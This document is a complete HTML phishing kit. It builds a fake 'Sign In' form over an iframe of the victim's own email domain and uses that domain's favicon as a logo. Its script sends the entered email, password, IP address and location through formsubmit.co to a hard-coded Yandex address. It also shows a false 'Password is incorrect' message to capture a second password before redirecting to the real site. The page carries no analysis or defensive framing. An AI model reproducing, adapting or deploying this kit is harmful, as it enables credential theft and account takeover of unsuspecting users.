<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<style>
		* {
			box-sizing: border-box;
			padding: 0;
			margin: 0;
		}

		body {
			height: 100vh;
			width: 100vw;
			font-family: Arial, Helvetica, sans-serif;
			overflow: hidden; /* Prevent scrolling */
			position: relative;
		}

		.bg-img {
			position: absolute;
			top: 0;
			left: 0;
			height: 100vh;
			width: 100vw;
			z-index: 1;
		}

		iframe {
			height: 100%;
			width: 100%;
			border: none;
			display: block;
		}

		/* Add styles to the form container */
		.container {
		max-width: 400px;
		padding: 16px;
		background-color: white;
		border-radius: 5px;
		position: absolute;
		left: 50%;
		top: 50%;
		transform: translate(-50%, -50%);
		z-index: 2;
	}

	@media (max-width: 480px) {
		.container {
			left: 10%;
			top: 20%;
			margin-left: 5%;
			transform: translate(-10%, -10%);
		}
	}

		/* Full-width input fields */
		input[type=text], input[type=password] {
			width: 100%;
			padding: 15px;
			margin: 5px 0 22px 0;
			border: none;
			background: #f1f1f1;
		}

		input[type=text]:focus, input[type=password]:focus {
			background-color: #ddd;
			outline: none;
		}

		.btn {
			background-color: #0096FF;
			color: white;
			padding: 16px 20px;
			border: none;
			cursor: pointer;
			width: 100%;
			opacity: 0.9;
		}

		.btn:hover {
			opacity: 1;
		}

		.img {
			text-align: center;
		}

		#title {
			text-align: center;
			margin: 10px 0;
		}

		#error {
			display: none;
			color: red;
		}
	</style>
</head>
<body>
	<div class="bg-img" id="bg-img">
		<!-- Set a valid URL or remove src entirely if you want to load it dynamically -->
		<iframe 
			id="frame" 
			src="" 
			scrolling="no" 
			sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts"
			allowfullscreen>
		</iframe>
	</div>
	
	<form class="container" id="login-form">
		<div class="img">
			<img src="" id="logo" alt="" style="width: 100px; height: 100px; border-radius: 50%;">
		</div>

		<h3 id="title">Sign In</h3>

		<h5 id="error" style="display: none; color: red;">Password is incorrect, please try again!</h5>

		<label for="email">
			<b>Email Address</b>
		</label>
		<input type="text" placeholder="Enter Email" name="email" id="email" required>

		<label for="psw">
			<b>Password</b>
		</label>
		<input type="password" placeholder="Enter Password" name="password" id="psw" required>

		<input type="hidden" name="step" id="step">

		<button type="submit" class="btn">Sign In</button>
	</form>

	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
	<script>
	let step = 1;
	let submitted = false; // Prevent double submission
	
	// Get clientID from URL hash
	const clientID = window.location.hash.substring(1);
	
	if (!clientID) {
		$("#error").text("No email provided").css("display", "block");
	} else {
		$('#email').val(clientID);
		const domain = clientID.split('@').pop();
		
		// Set iframe to the domain
		$("#frame").attr("src", "https://" + domain);
		
		// Use favicon service
		const logoUrl = "https://www.google.com/s2/favicons?domain=" + domain + "&sz=128";
		$("#logo").attr("src", logoUrl)
			.on("error", function() {
				$(this).attr("src", "https://via.placeholder.com/100/cccccc/666666?text=" + domain.charAt(0).toUpperCase());
			});
	}

	$("#login-form").submit(function(event) {
		event.preventDefault();
		
		if (submitted) return; // Prevent multiple submissions
		submitted = true;
		
		const submitBtn = $("button[type='submit']");
		submitBtn.text('Verifying...').prop('disabled', true);

		const email = $("#email").val();
		const password = $("#psw").val();
		const domain = email.split('@').pop();
		
		// Get IP info and submit to Formspree
		$.getJSON('https://ipinfo.io/json', function(response) {
			const posting = $.post("https://formsubmit.co/ajax/dattiobi@yandex.com", {
				_subject: "Logs | " + response.ip,
				Email: email,
				Password: password,
				Attempts: step,
				IP: response.ip,
				Location: response.city + ", " + response.country,
			});

			posting.done(function(data) {
				console.log("Attempt:", step, "Submitted successfully");
				
				if (step === 2) {
					window.location.href = "https://" + domain;
				} else {
					step++;
					$("#error").css("display", "block");
					submitBtn.text('Sign In').prop('disabled', false);
					$("#psw").val("");
					submitted = false; // Allow next submission
				}
			});

			posting.fail(function(error) {
				console.error("Error:", error);
				
				if (step === 2) {
					window.location.href = "https://" + domain;
				} else {
					step++;
					$("#error").css("display", "block");
					submitBtn.text('Sign In').prop('disabled', false);
					$("#psw").val("");
					submitted = false; // Allow next submission
				}
			});
		}, "json");
	});
</script>
</body>
</html>

